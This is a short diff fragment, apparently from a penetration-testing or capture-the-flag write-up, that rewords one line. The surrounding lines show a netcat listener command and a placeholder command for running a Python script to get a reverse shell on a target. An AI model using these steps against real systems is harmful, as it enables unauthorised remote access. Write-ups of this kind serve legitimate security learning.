@@ -25,7 +25,7 @@ Next step was to open up a netcat listner:
 
 nc -lvnp <port>
 
-Then run the shell:
+Then run the script to get the shell:
 
 python3 <shell>.py <target> <attacker> <listening port>
 
